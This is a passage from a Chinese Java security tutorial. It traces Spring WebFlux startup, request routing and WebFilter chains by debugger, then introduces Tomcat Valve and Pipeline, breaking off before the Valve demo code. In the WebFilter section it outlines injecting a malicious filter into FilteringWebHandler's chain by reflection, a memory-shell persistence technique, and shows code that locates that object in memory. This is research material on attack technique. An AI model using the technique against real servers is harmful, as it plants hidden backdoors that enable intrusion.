中的元素进行映射。</td><td><code>Mono&lt;Integer&gt; resultMono = mono.map(s -&gt; s.length());</code></td></tr><tr><td><code>Mono.flatMap(Function&lt;? super T, ? extends Mono&lt;? extends V&gt;&gt; transformer)</code></td><td>对 <code>Mono</code> 中的元素进行异步映射。</td><td><code>Mono&lt;Integer&gt; resultMono = mono.flatMap(s -&gt; Mono.just(s.length()));</code></td></tr><tr><td><code>Mono.filter(Predicate&lt;? super T&gt; tester)</code></td><td>过滤 <code>Mono</code> 中的元素。</td><td><code>Mono&lt;String&gt; filteredMono = mono.filter(s -&gt; s.length() &gt; 5);</code></td></tr><tr><td><code>Mono.defaultIfEmpty(T defaultVal)</code></td><td>如果 <code>Mono</code> 为空，则使用默认值。</td><td><code>Mono&lt;String&gt; resultMono = mono.defaultIfEmpty("Default Value");</code></td></tr><tr><td><code>Mono.onErrorResume(Function&lt;? super Throwable, ? extends Mono&lt;? extends T&gt;&gt; fallback)</code></td><td>在发生错误时提供一个备用的 <code>Mono</code>。</td><td><code>Mono&lt;String&gt; resultMono = mono.onErrorResume(e -&gt; Mono.just("Fallback Value"));</code></td></tr><tr><td><code>Mono.doOnNext(Consumer&lt;? super T&gt; consumer)</code></td><td>在成功时执行操作，但不更改元素。</td><td><code>Mono&lt;String&gt; resultMono = mono.doOnNext(s -&gt; System.out.println("Received: " + s));</code></td></tr><tr><td><code>Mono.doOnError(Consumer&lt;? super Throwable&gt; onError)</code></td><td>在发生错误时执行操作。</td><td><code>Mono&lt;String&gt; resultMono = mono.doOnError(e -&gt; System.err.println("Error: " + e.getMessage()));</code></td></tr><tr><td><code>Mono.doFinally(Consumer&lt;SignalType&gt; action)</code></td><td>无论成功还是出错都执行操作。</td><td><code>Mono&lt;String&gt; resultMono = mono.doFinally(signal -&gt; System.out.println("Processing finished: " + signal));</code></td></tr></tbody></table>

### 2.12.2 什么是 Flux？

`Flux`表示的是`0`到`N`个元素的异步序列，可以以异步的方式按照时间的推移逐个或一批一批地`publish`元素。也就是说，`Flux`允许在处理元素的过程中，不必等待所有元素都准备好，而是可以在它们准备好的时候立即推送给订阅者。这种异步的推送方式使得程序可以更灵活地处理元素的生成和消费，而不会阻塞执行线程。

下面是`Flux`常用的`api`：

<table><thead><tr><th>API</th><th>说明</th><th>代码示例</th></tr></thead><tbody><tr><td><strong><code>Flux.just</code></strong></td><td>创建包含指定元素的<code>Flux</code></td><td><code>Flux&lt;String&gt; flux = Flux.just("A", "B", "C");</code></td></tr><tr><td><strong><code>Flux.fromIterable</code></strong></td><td>从<code>Iterable</code>创建<code>Flux</code></td><td><code>List&lt;String&gt; list = Arrays.asList("A", "B", "C");</code><br><code>Flux&lt;String&gt; flux = Flux.fromIterable(list);</code></td></tr><tr><td><strong><code>Flux.fromArray</code></strong></td><td>从数组创建<code>Flux</code></td><td><code>String[] array = {"A", "B", "C"};</code><br><code>Flux&lt;String&gt; flux = Flux.fromArray(array);</code></td></tr><tr><td><strong><code>Flux.empty</code></strong></td><td>创建一个空的<code>Flux</code></td><td><code>Flux&lt;Object&gt; emptyFlux = Flux.empty();</code></td></tr><tr><td><strong><code>Flux.error</code></strong></td><td>创建一个包含错误的<code>Flux</code></td><td><code>Flux&lt;Object&gt; errorFlux = Flux.error(new RuntimeException("Something went wrong"));</code></td></tr><tr><td><strong><code>Flux.range</code></strong></td><td>创建包含指定范围的整数序列的<code>Flux</code></td><td><code>Flux&lt;Integer&gt; rangeFlux = Flux.range(1, 5);</code></td></tr><tr><td><strong><code>Flux.interval</code></strong></td><td>创建包含定期间隔的元素的<code>Flux</code></td><td><code>Flux&lt;Long&gt; intervalFlux = Flux.interval(Duration.ofSeconds(1)).take(5);</code></td></tr><tr><td><strong><code>Flux.merge</code></strong></td><td>合并多个 Flux，按照时间顺序交织元素</td><td><code>Flux&lt;String&gt; flux1 = Flux.just("A", "B");</code><br><code>Flux&lt;String&gt; flux2 = Flux.just("C", "D");</code><br><code>Flux&lt;String&gt; mergedFlux = Flux.merge(flux1, flux2);</code></td></tr><tr><td><strong><code>Flux.concat</code></strong></td><td>连接多个<code>Flux</code>，按照顺序发布元素</td><td><code>Flux&lt;String&gt; flux1 = Flux.just("A", "B");</code><br><code>Flux&lt;String&gt; flux2 = Flux.just("C", "D");</code><br><code>Flux&lt;String&gt; concatenatedFlux = Flux.concat(flux1, flux2);</code></td></tr><tr><td><strong><code>Flux.zip</code></strong></td><td>将多个<code>Flux</code>的元素进行配对，生成<code>Tuple</code></td><td><code>Flux&lt;String&gt; flux1 = Flux.just("A", "B");</code><br><code>Flux&lt;String&gt; flux2 = Flux.just("1", "2");</code><br><code>Flux&lt;Tuple2&lt;String, String&gt;&gt; zippedFlux = Flux.zip(flux1, flux2);</code></td></tr><tr><td><strong><code>Flux.filter</code></strong></td><td>过滤满足条件的元素</td><td><code>Flux&lt;Integer&gt; numbers = Flux.range(1, 5);</code><br><code>Flux&lt;Integer&gt; filteredFlux = numbers.filter(n -&gt; n % 2 == 0);</code></td></tr><tr><td><strong><code>Flux.map</code></strong></td><td>转换每个元素的值</td><td><code>Flux&lt;String&gt; words = Flux.just("apple", "banana", "cherry");</code><br><code>Flux&lt;Integer&gt; wordLengths = words.map(String::length);</code></td></tr><tr><td><strong><code>Flux.flatMap</code></strong></td><td>将每个元素映射到一个<code>Flux</code>，并将结果平铺</td><td><code>Flux&lt;String&gt; letters = Flux.just("A", "B", "C");</code><br><code>Flux&lt;String&gt; flatMappedFlux = letters.flatMap(letter -&gt; Flux.just(letter, letter.toLowerCase()));</code></td></tr></tbody></table>

### 2.12.3 Spring WebFlux 启动过程分析

本来是想先用文字聊一堆关于`Spring MVC`和`Spring WebFlux`之间的区别的，但是这个已经被网上现有的不多的关于`WebFlux`的文章讲烂了，大家随便搜都可以搜到，皮毛性的东西纯属浪费时间，于是我们直接看代码，去深挖`WebFlux`的调用过程，从中我们自然可以发现这两者在调用过程中的类似和不同的地方。

我们直接在`run`方法这里下断点，然后直接`step into`：

![](../../.resource/remote/c561a914f875deb2de6c6e5cc3bb776213c330c2ac423f912ef657cde93a5722.png)

一步步地`step over`之后，我们可以看到调用了`org.springframework.boot.SpringApplication#createApplicationContext`这个方法（前面的那些方法并不重要，直接略过就行）：

![](../../.resource/remote/486c48d236439903de77061cb66a12044e6cb02b5bd785993a4b0da83df4c702.png)

这个方法光听名字`createApplicationContext`，就感觉很重要，因为字面意思就是创建`ApplicationContext`，这正是我们感兴趣的内容，我们`step into`进去看看：

![](../../.resource/remote/4ead83218d5efa556d083141e5adf07807b15ac4f7b39239839f1409fa1cd6e7.png)

可以看到，是根据不同的`webApplicationType`去选择创建不同的`context`，比如我们这里的`webApplicationType`就是`REACTIVE`，也就是响应式的。

我们`step into`这里的`create`方法：

![](../../.resource/remote/ab5c879280e566a453dbfeacfd71209225cb045ed664bf6414052b9fcb557c1f.png)

发现里面有两个静态方法、一个`create`方法和一个默认实现 `DEFAULT`，这个默认实现通过加载 `ApplicationContextFactory` 的所有候选实现，创建相应的上下文；如果没有找到合适的实现，则默认返回一个 `AnnotationConfigApplicationContext` 实例。

我们继续`step over`走下去，可以看到我们`REACTIVE`对应的`context`是`AnnotationConfigReactiveWebServerApplicationContext`：

![](../../.resource/remote/be8866fe65b6a72f2677efad3d0950cd51c1e735723dd805eef2ce7b4b1f2b3f.png)

继续往下走，我们会回到一开始这里，可以看到接下来会调用`prepareContext`、`refreshContext`和`afterRefresh`方法，这个过程就是一系列的初始化、监听的注册等操作：

![](../../.resource/remote/fafb36293574fded2467993f304d0384acb15de02de324a95187a8af72d9cb7b.png)

我们`step into`这里的`refreshContext`方法：

![](../../.resource/remote/660fd30276fbb75c53cc8a7e24ff644e5c3135a84b8ff821f5b3430799eba3c2.png)

接着`step into`这里的`refresh`方法：

![](../../.resource/remote/bc67a166e58d2e5cc1c65af40cf2183a2d156ee942543726fd6301bce9f79a06.png)

进来之后，接着`step into`这里的`refresh`方法：

![](../../.resource/remote/3483e5958bf876931276cb7a98ac0b93468cad532b629d518780a194dd577db9.png)

可以看到，这里调用了一个`super.refresh`，也就是父类的`refresh`方法：

![](../../.resource/remote/305db2936b8fe4cfd5628729cf2e1e45df60216fc58841c7acf6a58a5a2b14e0.png)

我们继续`step into`查看，发现这里调用了`onRefresh`方法：

![](../../.resource/remote/43eb708b12c18da6305a5a34d9b860017d48044d164f36a75232ed373af82453.png)

我们`step into`这里的`onRefresh`，发现它调用了关键的`org.springframework.boot.web.reactive.context.ReactiveWebServerApplicationContext#createWebServer`：

![](../../.resource/remote/aca5eb7941f8c289312f743d21cc401cb321e3d8c358db45ae504459f8bcc3ea.png)

继续`step over`可以看到，由于我们使用的是`Netty`而不是`Tomcat`，因此这里最终会调用`NettyReactiveWebServerFactory`类中的`getWebServer`方法：

![](../../.resource/remote/b15b7a345f69d5b79745682ae0683934e9b3a27d58766be799349cd9a518dbe8.png)![](../../.resource/remote/f82778fbba30041f70efb5553c04b25365f64f5bf75f0a5c709b0776ec22941d.png)

而上图中的`WebServerManager`类也是一个重要的封装类，里面有两个成员变量，一个是底层服务器的抽象`WebServer`，另一个是上层方法处理者的抽象`DelayedInitializationHttpHandler`：

![](../../.resource/remote/071bcd466ec8f3b646afa788f82904766907ee8ad8497ca4537c540183fb41ff.png)

那这个`webserver`具体是怎么启动的呢？我们继续走到`finishRefresh`这个方法这里来，如果这里我们直接无脑`step over`，程序最终会回到`run`方法，说明，启动`webserver`的地方肯定就在这个`finishRefresh`方法里面：

![](../../.resource/remote/7952d32763ff4ea3a47dd1a1474fc4e588518e3b9ca635c4e491b55c4b89f67e.png)

我们`step into`进去看看：

![](../../.resource/remote/1f530ab98db6dcc003b6d8874defbda93c61d431b967db360fc4598bdd436d53.png)

接着`step into`去看看这里调用的`getLifecycleProcessor().onRefresh()`方法，发现调用了`startBeans`方法，并且设置了自启动：

![](../../.resource/remote/24092c0ae6857518b7ddfd56dfe844ffd49cac54e867eda31c6cd6a74e639100.png)

我们直接`step into`这个`startBeans`方法，一步步地`step over`过后，会发现调用了`start`方法，看来我们在逐渐逼近真相：

![](../../.resource/remote/b7282d24ca418408ac655a84ddcaabd9a297174d494df4937d03ec33e9534236.png)

我们继续`step into`这个`start`方法，发现调用了`org.springframework.context.support.DefaultLifecycleProcessor#doStart`这个方法：

![](../../.resource/remote/f83115e086424174b04b9c16bd99e3012ac95a2972916de5f84751726cab3979.png)

直接`step into`进去看看，发现由于`dependenciesForBean`为 []，所以没有调用`doStart`方法，直接就是调用`bean.start()`：

![](../../.resource/remote/031df1a6d9615db1dd039e4d3a252f13ba7faf9f2a3ed9501139ab4fc366f70c.png)

继续`step into`这个`start`方法看看：

![](../../.resource/remote/533a7ad0f7dc75b2e35e89c7e77e895958f73943087243f072a37585b9b5af0d.png)

怎么会啥也没有呢？奇了怪了，到底是哪里出了问题了呢？我在这一步愣住了，决定把之前打的断点取消，在如下俩图所示的位置打上断点重新调试，因为这两个方法是关键方法：

![](../../.resource/remote/9b2bd6b76e1b0c6b8d958dfcd527ff567b2ce0695b0deb5acd16f3dd451c447a.png)![](../../.resource/remote/50801df07e190317c74fa04ab3e5db369a97be4467d5a63672f024e53e4126de.png)

调试了几遍之后发现是我疏忽了，这里的`this.lifecycleBeans`里面其实有三个，每调用一次`doStart`方法就会删掉一个：

![](../../.resource/remote/3d4ea009290829d9a1bd222b4659e603f031dbd1e102f69a9d0daf2804d26ff0.png)![](../../.resource/remote/2fd46ee25d6911bed6ba93eadfa5d8da1c312e495beeba449fefaff99b57152b.png)

可以看到，我们刚才调用的是第一个`bean`的，所以当然没有启动`webserver`相关的方法了：

![](../../.resource/remote/af00054de6d2473c41d85ed6173a9e26686cb9d2b935b7ad07282fa59e0e3572.png)

我们一步步`step over`，当`memeber.name`为`webServerStartStop`时，我们再`step into`这个`doStart`方法里面的`bean.start()`：

![](../../.resource/remote/d78ac650cb844a49e799b3445e24321d09ee36036f7d70f14460ffbbc6d221cf.png)

即可看到`this.weServerManager.start()`：

![](../../.resource/remote/9b86723e63f75ea73f912ea5275a9c4cb6893a3a3906bee3dcde45486c95a70e.png)

我们继续`step into`这个`start`方法：

![](../../.resource/remote/b0de1017a0b0156773667587d3ee1def61d7e1e256226744e9a8be8a8cabcedf.png)

仔细看看上面红框中的代码，先是初始化`HttpHandler`，这个方法其实根据`lazyInit`的值的不同来决定何时初始化，如果`lazyInit`值为`true`，那么就等第一次请求到来时才真正初始化；如果为`false`，那么就在 `WebServerManager` 的 `start` 方法中调用 `initializeHandler` 直接初始化：

![](../../.resource/remote/fdfada6c226a9596a6fb5ff0fe2193ed35edac64cb72b953f3e59ea3b27580cb.png)

我们继续步入这里的`start`方法，发现其位置为`org.springframework.boot.web.embedded.netty.NettyWebServer#start`

![](../../.resource/remote/59e2f2b234855231c7b477b9fcc042d8bffd619cb65877718feeeceaf9306a4b.png)

到这里才算真正明了，真正的`webServer`启动的关键方法是`org.springframework.boot.web.embedded.netty.NettyWebServer#startHttpServer`：

![](../../.resource/remote/64c8d45c58c5e986954a2b8d6c26578bce3660c061380a49264f95a84e102a58.png)

从下面的`this.webServer`中也可以看到，绑定的是`0.0.0.0:9191`：

![](../../.resource/remote/03874bdae4222fcf53bd4e68c95f04e0b01b3c86fb6babbcabfb685770626fb4.png)

### 2.12.4 Spring WebFlux 请求处理过程分析

当一个请求过来的时候，`Spring WebFlux`是如何进行处理的呢？

这里我们在`org.example.webfluxmemoryshelldemo.hello.GreetingHandler#hello`这里打上断点，然后进行调试，访问`http://127.0.0.1:9191/hello`触发`debug`：

![](../../.resource/remote/009134b60034f17628a4043eb68dedba08c4f797757beeacb7937bd954d780c5.png)

一步步地`step over`后来到`org.springframework.web.reactive.DispatcherHandler#invokeHandler`：

![](../../.resource/remote/fc05e36587958f5952b637893cb8bd3a49193cfe5f645c43a9bd9b91defbf1ac.png)

`step into`之后可以看到是`org.springframework.web.reactive.DispatcherHandler#handle`：

![](../../.resource/remote/90654d28bd1c3b11236ab7790da78cba354298b52f8ee50a968efdcb9a186871.png)

解释上面代码中的`return`部分，首先检查`handlerMappings`是否为`null`，如果是，那就调用`createNotFoundError`方法返回一个表示未找到处理程序的`Mono`；接着通过`CorsUtils.isPreFlightRequest`方法检查是否为预检请求，如果是，那就调用`handlePreFlight`方法处理预检请求，如果不是预检请求且`handlerMappings`不为`null`，通过一系列的操作，获取到请求的`handler`，然后调用`invokeHandler`方法执行处理程序，再调用`handleResult`方法处理执行结果，最终返回一个表示处理完成的`Mono`。

左下角的`Threads & Variables`这里，我们往下翻，可以看到在此之前是调用了一个`org.springframework.web.reactive.handler.AbstractHandlerMapping#getHandler`：

![](../../.resource/remote/95b2f3f27ced6c1bae7d4e9717283356060d0c2e54ba0e028ecac9e5a78f6f0c.png)

我们把之前的断点去掉，然后在该函数这里打上断点：

![](../../.resource/remote/9582f5680cd7d6138bdea2567c0706d80e15b379ea618c3a25c43b332495d009.png)

发现调用了`org.springframework.web.reactive.handler.AbstractHandlerMapping#getHandlerInternal`，我们再回去看，发现调用位置在`org.springframework.web.reactive.function.server.support.RouterFunctionMapping#getHandlerInternal`：

![](../../.resource/remote/a4fde1a300460e94f7116e03c24ff3ef56f33382820df72057f302caef984f86.png)

点击去：

![](../../.resource/remote/514b7361dd5072d6cd1af4f8f5d4308da9deca200e4b0a34bfad173962b99154.png)

这里最终创建的是`DefaultServerRequest`对象，需要注意的是在创建该对象时将`RouterFunctionMapping`中保存的`HttpMessageReader`列表作为参数传入，这样`DefaultServerRequest`对象就有了解析参数的能力。

回到`getHandlerInternal`这个函数，看它的`return`里面的匿名函数，发现其调用了`org.springframework.web.reactive.function.server.RouterFunction#route`，我们点进去看看：

发现只是在接口中定义了下：

![](../../.resource/remote/7d11070f4af7e7ba907dc40ff710b18dd54f79286ea68f28b24575988edbd5a4.png)

于是去翻之前的`Threads & Variables`：

![](../../.resource/remote/0f08d66ac07200739fbdeb57c5f4b5b1409027aaf816e28e995d19c7020445c1.png)

首先调用`this.predicate.test`方法来判断传入的`ServerRequest`是否符合路由要求，如果匹配到了处理方法，那就将保存的`HandlerFunction`实现返回，否则就返回空的`Mono`。

点进去这个`test`方法，发现还是个接口，结合之前的`RouterFunction.java`和`RouterFunctions.java`的命名规则，合理猜测`test`方法的实现应该是在`RequestPredicates.java`里面。果然是有的，我们取消之前下的所有断点，在`test`函数这里重新打上断点后调试：

![](../../.resource/remote/a4b4d5c0983455c753ab7f08023f734794ede43eb543f3fd60f72679e3490638.png)

可以看到这里已经拿到了`pattern`，那就还差解析`request`里面的`GET`这个方法了：

![](../../.resource/remote/b96f1cfa8c2113a3753b017c6b3ae521a6cdc395611d6b115b0673518e11913f.png)

我们继续`step over`，发现直接跳到了这里，我当时就挺纳闷儿，这里的`this.left`和`this.right`怎么就已知了：

![](../../.resource/remote/d8e6aecfc3ba9f2e8f068f737919977dd6952251c7aef3bbe4a1a5c2246bc4b6.png)

这俩变量已知说明在执行`test`之前肯定是已经被赋值了，我继续往后`step over`，从下图中可以看到，此时二者之间多了个`&&`，不难猜测，应该是调用了`org.springframework.web.reactive.function.server.RequestPredicates.AndRequestPredicate`方法，因为还有一个`OrRequestPredicate`，这个`or`的话应该就是`||`了：

![](../../.resource/remote/4537c0afe7972cda518071017a2b125976302aa867a8b49318f92a0498197ade.png)

于是我们再在`AndRequestPredicate`方法这打上断点，此时我们还没有访问`http://127.0.0.1:9191/hello`，就已经触发调试了，这是因为我们在`GreetingRouter.java`里面写的代码中有`GET`方法、`/hello`路由还有`and`方法，因此会调用到`AndRequestPredicate`，并把`GET`和`/hello`分别复制给`this.left`和`this.right`：

![](../../.resource/remote/e0a2964460aa7e8286c8fbab7925249a2e252e4337a18ee69fc4939090b4ad98.png)![](../../.resource/remote/9afd5c888a1195d0de95ab949c7fc80f34234b8c716b70c308ef4f6d07486666.png)![](../../.resource/remote/345cb0989df935d16a302862c7bb333799e3948ca1a5d602b1e201a5614a7da6.png)

到这里，我们基本就了解了路由匹配这么个事情。接下来我们要考虑的事情就是如何处理请求，这个就比较简单了，为什么这么说呢？因为在我们`2.12.3`节中的分析中已经基本涉及到了。我们还是在`org.springframework.web.reactive.DispatcherHandler#invokeHandler`打下断点调试：

![](../../.resource/remote/1f8c48fc50fdcad83db86c495441d41bec4b2cbf90d21d08a3e1b12410985c04.png)

可以看到，这里的`this.handlerAdapters`里面有四个`handlerAdapter`：

![](../../.resource/remote/57d8f21d028c860d42e6a03645330044dc5ec4e90199fc2b160722df4f8647e8.png)

并不是所有的`handlerAdapter`都会触发`handle`方法，只有当支持我们给定的`handler`的`handlerAdapter`才可以调用：

![](../../.resource/remote/1be9293b180a4bf15a8d186b2f7c6146def00822c359de0d157e08b4ebfb57d3.png)![](../../.resource/remote/bde712697049dcd8e29a7821cddf19fe2b0715318eba9533f618991b5e2b332a.png)

然后我们`step into`这里的`handlerAdapter.handle`方法，发现是在`org.springframework.web.reactive.function.server.support.HandlerFunctionAdapter#handle`：

![](../../.resource/remote/877d30433592f5898ed1a8714dae9c33d0201888ecfcce57e244d9be4c83dc61.png)

而这里的`handlerFunction.handle`也就是我们编写的`route`方法：

![](../../.resource/remote/817eef5868412974a9e51f8f3d048b30a0779afe2e808744f7b03a44672f19b5.png)

到这里，关于处理请求的部分也就完结了。

### 2.12.5 Spring WebFlux 过滤器 WebFilter 运行过程分析

对于`Spring WebFlux`而言，由于没有拦截器和监听器这个概念，要想实现权限验证和访问控制的话，就得使用`Filter`，关于这一部分知识可以参考 Spring 的官方文档：

> https://docs.spring.io/spring-security/reference/reactive/configuration/webflux.html

而在`Spring Webflux`中，存在两种类型的过滤器：一个是`WebFilter`，实现自`org.springframework.web.server.WebFilter`接口。通过实现这个接口，可以定义全局的过滤器，它可以在请求被路由到`handler`之前或者之后执行一些逻辑；另一个就是`HandlerFilterFunction`，它是一种函数式编程的过滤器类型，实现自`org.springframework.web.reactive.function.server.HandlerFilterFunction`接口，与`WebFilter`相比它更加注重函数式编程的风格，可以用于处理基于路由的过滤逻辑。

这里我们以`WebFilter`为例，看看它的运行过程。新建一个`GreetingFilter.java`，代码如下：

```
package org.example.webfluxmemoryshelldemo.hello;

import org.springframework.http.server.reactive.ServerHttpRequest;
import org.springframework.stereotype.Component;
import org.springframework.web.server.ServerWebExchange;
import org.springframework.web.server.WebFilter;
import org.springframework.web.server.WebFilterChain;
import org.springframework.web.util.pattern.PathPattern;
import org.springframework.web.util.pattern.PathPatternParser;
import reactor.core.publisher.Mono;

@Component
public class GreetingFilter implements WebFilter {
    @Override
    public Mono<Void> filter(ServerWebExchange serverWebExchange, WebFilterChain webFilterChain) {
        PathPattern pattern=new PathPatternParser().parse("/hello/**");
        ServerHttpRequest request=serverWebExchange.getRequest();
        if (pattern.matches(request.getPath().pathWithinApplication())){
            System.out.println("hello, this is our filter!");
        }
        return webFilterChain.filter(serverWebExchange);
    }
}


```

效果如下：

![](../../.resource/remote/3c984f685d94df73f679eeea82dcf6196f406acf40ac235d467f5aee5acf59b7.png)

我们直接在`filter`函数这里下断点，进行调试：

![](../../.resource/remote/d075d8f3ec9bc26be4159114f8df24659bc91d388ab731e503695dd32eefa79e.png)

注意到`return`中调用了`filter`函数，于是`step into`看看：

![](../../.resource/remote/132f290765b95e73c7952db1953ee992ac754acd9189c401ea4c1c75b47e23c9.png)

可以看到是调用了`invokeFilter`函数。我们仔细看看这个`DefaultWebFilterChain`类：

![](../../.resource/remote/ef0b649f2ff18f6bbe8cfc35d9e6e1ea218f3388687cf6003099a0d37e836f2d.png)

可以看到是有三个名为`DefaultWebFilterChain`的函数，其中第一个是公共构造函数，第二个是私有构造函数（用来创建`chain`的中间节点），第三个是已经过时的构造函数。而在该类的注释中，有这样一句话：

> Each instance of this class represents one link in the chain. The public constructor DefaultWebFilterChain(WebHandler, List) initializes the full chain and represents its first link.
> 
> ![](../../.resource/remote/ee1bb2686c97de2bb0e2d1d5223ef4982097fd2641d9fd94bb19366022d8e556.png)

也就是说，通过调用 `DefaultWebFilterChain` 类的公共构造函数，我们初始化了一个完整的过滤器链，其中的每个实例都代表链中的一个`link`，而不是一个`chain`，这就意味着我们无法通过修改下图中的`chain.allFilters`来实现新增`Filter`：

![](../../.resource/remote/e96d8dfd2607a60567ea1aedf3d5d32923ea3d08dd9f3c12bf95aa0502dc6c48.png)

但是这个类里面有个`initChain`方法用来初始化过滤器链，这个方法里面调用的是这个私有构造方法：

![](../../.resource/remote/a70e6fe1732620cc799aed324cf182ce84074aeb0592475951cba54ece17eb1e.png)

那我们就看看这个公共构造方法是在哪里调用的：

光标移至该方法，按两下`Ctrl+Alt+F7`：

![](../../.resource/remote/2e854123ed744abef24ba35a81800987c6c5c4fcb828d7f6ac68157a6105726b.png)

调用的地方位于`org.springframework.web.server.handler.FilteringWebHandler#FilteringWebHandler`：

![](../../.resource/remote/aa6604125902fd3502332a8b39c01523256f8f4a4e0b69b81bc889574fea38a3.png)

那思路就来了，我们只需要构造一个`DefaultWebFilterChain`对象，，然后把它通过反射写入到`FilteringWebHandler`类对象的`chain`属性中就可以了。

那现在就剩下传入`handler`和`filters`这两个参数了，这个`handler`参数很好搞，就在`chain`里面：

![](../../.resource/remote/d26e10f2ce1d2354013fb7060093cccd0513378150410da1408c07896dedf210.png)

然后这个`filters`的话，我们可以先获取到它本来的`filters`，然后把我们自己写的恶意`filter`放进去，放到第一位，就可以了。

那现在就是从内存中找到`DefaultWebFilterChain`的位置，然后一步步反射就行。这里直接使用工具`https://github.com/c0ny1/java-object-searcher`，克隆下来该项目，放到`idea`中`mvn clean install`：

![](../../.resource/remote/b9d1f8f27ba9c0491aa96005c8a891f36f8b96a81a9af7e723503b351f4e0ed5.png)image-20240126134339217

然后把生成的这个`java-object-searcher-0.1.0.jar`放到我们的`WebFluxMemoryShellDemo`项目的 Project `Structure`中的`Libraries`中：

![](../../.resource/remote/b43c36b50443510531fee8178fe5b54068ce71a780b7a033e0b31a17d23cefc9.png)

然后我们把我们的`GreetingFilter.java`的代码修改成下面的：

```
package org.example.webfluxmemoryshelldemo.hello;

import org.springframework.http.server.reactive.ServerHttpRequest;
import org.springframework.stereotype.Component;
import org.springframework.web.server.ServerWebExchange;
import org.springframework.web.server.WebFilter;
import org.springframework.web.server.WebFilterChain;
import org.springframework.web.util.pattern.PathPattern;
import org.springframework.web.util.pattern.PathPatternParser;
import reactor.core.publisher.Mono;

import me.gv7.tools.josearcher.entity.Blacklist;
import me.gv7.tools.josearcher.entity.Keyword;
import me.gv7.tools.josearcher.searcher.SearchRequstByBFS;
import java.util.ArrayList;
import java.util.List;

@Component
public class GreetingFilter implements WebFilter {
    @Override
    public Mono<Void> filter(ServerWebExchange serverWebExchange, WebFilterChain webFilterChain) {
        PathPattern pattern=new PathPatternParser().parse("/hello/**");
        ServerHttpRequest request=serverWebExchange.getRequest();
        if (pattern.matches(request.getPath().pathWithinApplication())){
            System.out.println("hello, this is our GreetingFilter!");
        }
        List<Keyword> keys = new ArrayList<>();
        keys.add(new Keyword.Builder().setField_type("DefaultWebFilterChain").build());
        List<Blacklist> blacklists = new ArrayList<>();
        blacklists.add(new Blacklist.Builder().setField_type("java.io.File").build());
        SearchRequstByBFS searcher = new SearchRequstByBFS(Thread.currentThread(),keys);
        searcher.setBlacklists(blacklists);
        searcher.setIs_debug(true);
        searcher.setMax_search_depth(10);
        searcher.setReport_save_path("D:\\javaSecEnv\\apache-tomcat-9.0.85\\bin");
        searcher.searchObject();
        return webFilterChain.filter(serverWebExchange);
    }
}


```

这里我们设置的关键字是`DefaultWebFilterChain`，然后直接运行：

![](../../.resource/remote/92f7b587e8d637b20c36c4bd66b4f01542f8693606bfefd41adb2129f5d64696.png)

也就是说，位置是在：

```
TargetObject = {reactor.netty.resources.DefaultLoopResources$EventLoop} 
  ---> group = {java.lang.ThreadGroup} 
   ---> threads = {class [Ljava.lang.Thread;} 
    ---> [3] = {org.springframework.boot.web.embedded.netty.NettyWebServer$1} 
     ---> this$0 = {org.springframework.boot.web.embedded.netty.NettyWebServer} 
      ---> handler = {org.springframework.http.server.reactive.ReactorHttpHandlerAdapter} 
       ---> httpHandler = {org.springframework.boot.web.reactive.context.WebServerManager$DelayedInitializationHttpHandler} 
        ---> delegate = {org.springframework.web.server.adapter.HttpWebHandlerAdapter} 
         ---> delegate = {org.springframework.web.server.handler.ExceptionHandlingWebHandler} 
           ---> delegate = {org.springframework.web.server.handler.FilteringWebHandler} 
            ---> chain = {org.springframework.web.server.handler.DefaultWebFilterChain}


```

2.13 Tomcat Valve 介绍与运行过程分析
---------------------------

### 2.13.1 Valve 与 Pipeline

在众多文章里面，下面的这篇我觉得是讲的最通俗易懂的，这里推荐给大家：

> https://www.cnblogs.com/coldridgeValley/p/5816414.html

这里我组合引用原文，做了适当的修改，概括一下：

`tomcat`中的`Container`有 4 种，分别是`Engine`、`Host`、`Context`和`Wrapper`，这`4`个`Container`的实现类分别是`StandardEngine`、`StandardHost`、`StandardContext`和`StandardWrapper`。`4`种容器的关系是包含关系，`Engine`包含`Host`，`Host`包含`Context`，`Context`包含`Wrapper`，`Wrapper`则代表最基础的一个`Servlet`。`tomcat`由`Connector`和`Container`两部分组成，而当网络请求过来的时候`Connector`先将请求包装为`Request`，然后将`Request`交由`Container`进行处理，最终返回给请求方。而`Container`处理的第一层就是`Engine`容器，但是在`tomcat`中`Engine`容器不会直接调用`Host`容器去处理请求，那么请求是怎么在`4`个容器中流转的，4 个容器之间是怎么依次调用的呢？

原来，当请求到达`Engine`容器的时候，`Engine`并非是直接调用对应的`Host`去处理相关的请求，而是调用了自己的一个组件去处理，这个组件就叫做`pipeline`组件，跟`pipeline`相关的还有个也是容器内部的组件，叫做`valve`组件。

`Pipeline`的作用就如其中文意思一样——管道，可以把不同容器想象成一个独立的个体，那么`pipeline`就可以理解为不同容器之间的管道，道路，桥梁。那`Valve`这个组件是什么东西呢？`Valve`也可以直接按照字面意思去理解为阀门。我们知道，在生活中可以看到每个管道上面都有阀门，`Pipeline`和`Valve`关系也是一样的。`Valve`代表管道上的阀门，可以控制管道的流向，当然每个管道上可以有多个阀门。如果把`Pipeline`比作公路的话，那么`Valve`可以理解为公路上的收费站，车代表`Pipeline`中的内容，那么每个收费站都会对其中的内容做一些处理（收费，查证件等）。

在`Catalina`中，`4`种容器都有自己的`Pipeline`组件，每个`Pipeline`组件上至少会设定一个`Valve`，这个`Valve`我们称之为`BaseValve`，也就是基础阀。基础阀的作用是连接当前容器的下一个容器（通常是自己的自容器），可以说基础阀是两个容器之间的桥梁。

`Pipeline`定义对应的接口`Pipeline`，标准实现了`StandardPipeline`。`Valve`定义对应的接口`Valve`，抽象实现类`ValveBase`，`4`个容器对应基础阀门分别是`StandardEngineValve`，`StandardHostValve`，`StandardContextValve`，`StandardWrapperValve`。在实际运行中，`Pipeline`和`Valve`运行机制如下图：

![](../../.resource/remote/f3cfd615eeb9489d2d1bb4bfac9e796125e57ac8fc7e0c9c35c359c38030506a.png)

这张图是新加坡的`Dennis Jacob`在`ApacheCON Asia 2022`上的演讲《Extending Valves in Tomcat》中的`PPT`中的图片，`pdf`链接如下：

> https://people.apache.org/~huxing/acasia2022/Dennis-Jacob-Extending-Valves-in-Tomcat.pdf

这篇演讲的录屏在`Youtube`上面可以找到：

> https://www.youtube.com/watch?v=Jmw-d0kyZ_4

### 2.13.2 编写一个简单 Tomcat Valve 的 demo

由于在`Tomcat`环境下使用 Valve 还要配置 web.xml，我嫌麻烦，于是直接使用`SpringBoot`来搭建。记得这里勾选的是`Spring Web`：

![](../../.resource/remote/f28db6556a6a7a06a6658385d0a90340b3f26fb504c5ba304457e890e6a9ecce.png)

然后创建`test`目录并在`test`目录下创建两个文件，`TestValve.java`：

```
